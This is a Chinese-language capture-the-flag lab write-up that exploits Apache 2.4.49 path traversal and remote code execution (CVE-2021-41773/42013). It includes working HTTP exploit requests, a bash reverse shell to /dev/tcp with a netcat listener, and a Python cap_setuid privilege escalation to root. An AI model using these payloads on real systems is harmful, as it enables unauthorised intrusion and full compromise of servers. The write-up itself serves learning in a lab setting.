# 一.侦察

#### 1.nmap

```
nmap -p- -sV 10.48.187.215
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.49
```

别人使用的是

```bash
sudo nmap -sS -sV -sC --min-rate 5000 10.10.239.45 -Pn -n
```

#### 2. gobuster

扫描目录

```
gobuster dir -u http://10.48.187.215/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

/assets               (Status: 301) [Size: 236] 
```



3.访问目录

发现他开放了目录浏览

Index of /assets

    Parent Directory
    .DS_Store
    css/
    fonts/
    images/
    js/

4.查看Untitled.DS_Store

```
root@ip-10-48-67-64:~# file Untitled.DS_Store 
Untitled.DS_Store: Apple Desktop Services Store

```

5.查看网页实际的作用

有各按钮发送了请求，http://10.48.187.215/assets/contact.php，但是服务器返回404 和我们目录看到的一样，

6.尝试路径遍历

GET /assets/../../../../etc/passwd  返回404

7.没办法了

查看别人的writeup，他提到有 **CVE-2021-41773**和**CVE-2021-42013** 漏洞
有路径遍历和远程代码执行的漏洞

8.搜索 **CVE-2021-41773**漏洞

```
GET /assets/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

但是返回了403 

9.尝试远程代码执行

```http
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: 10.48.187.215
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: text/plain
Content-Length: 7

echo;id
```

返回404

10.再次查看别人的write up

他先尝试远程代码执行，确定这个文件夹存在

```
└──╼ $curl http://10.10.239.45/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>

```

然后他尝试远程代码执行，，

```
└──╼ $curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
daemon
/bin
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```



11.反思自己的

刚才目录遍历跳的级数不够，实测需要跳4级，这样就能成功

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
Host: 10.48.187.215
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 23 Feb 2022 05:40:45 GMT
If-None-Match: "e281-5d8a8e82e3140"
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

echo;whoami
```

12.反向shell

```bash
root@ip-10-48-115-2:~# nc -lvnp 4444

```

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
Host: 10.48.187.215
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 23 Feb 2022 05:40:45 GMT
If-None-Match: "e281-5d8a8e82e3140"
Priority: u=0, i
Content-Type: application/text/plaind
Content-Length: 60

echo; /bin/bash -c "bash -i >& /dev/tcp/10.48.115.2/4444 0>&1"
```



13.查看自己的身份

```
daemon@4a70924bafa0:/bin$ whoami
whoami
daemon
daemon@4a70924bafa0:/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@4a70924bafa0:/bin$ 
```

我们uid为1 属于系统用户，需要提升权限才行

14.对提升权限不熟悉，查看writeup

它使用 getcap 来查看能力？

```bash
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
```



然后利用python 又启动了一个cli，可以看到是root用户了

```bash
/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
id
uid=0(root) gid=1(daemon) groups=1(daemon)

```



这里有关于docker逃逸的内容，我没学过
参考链接https://lanfran02.github.io/posts/ohmywebserver/

